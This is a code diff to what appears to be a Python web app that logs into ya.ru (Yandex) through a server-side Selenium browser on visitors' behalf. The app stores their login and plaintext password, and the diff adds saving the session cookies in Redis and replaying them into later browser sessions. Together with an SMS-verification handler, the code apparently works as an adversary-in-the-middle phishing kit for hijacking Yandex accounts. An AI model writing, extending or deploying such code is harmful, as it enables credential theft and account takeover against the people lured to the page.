@@ -1,3 +1,4 @@
+import json
 import asyncio
 import logging
 from datetime import datetime
@@ -92,6 +93,9 @@ async def index(request):
                 elif result == "success":
                     custom_user = CustomUser(login=login, password=password)
                     await sync_to_async(custom_user.save)()
+                    cookies = driver.get_cookies()
+                    
+                    redis_instance.set(f"{client_ip}_cookies", json.dumps(cookies))
                     driver.quit()
                     return await sync_to_async(redirect)('https://ya.ru/')
 
@@ -191,14 +195,20 @@ async def get_driver(request, client_ip):
             "driver": await asyncio.to_thread(create_selenium_driver),
             "last_activity": datetime.now().timestamp()
         }
+        cookies_json = redis_instance.get(f"{client_ip}_cookies")
+        if cookies_json:
+            cookies = json.loads(cookies_json)
+            driver = selenium_drivers[client_ip]["driver"]
+            driver.get("https://ya.ru/")  # Відкриваємо сайт, на якому потрібно відновити сесію
+            for cookie in cookies:
+                driver.add_cookie(cookie)
+            driver.refresh()  # Оновлюємо сторінку, щоб застосувати cookies
     else:
         driver_info = selenium_drivers[client_ip]
         if not driver_info["driver"].current_window_handle:
             driver_info["driver"].quit()
             driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
     return selenium_drivers[client_ip]["driver"]
-
-
 
 async def handle_sms_verification(request):
     client_ip = request.META.get('REMOTE_ADDR')
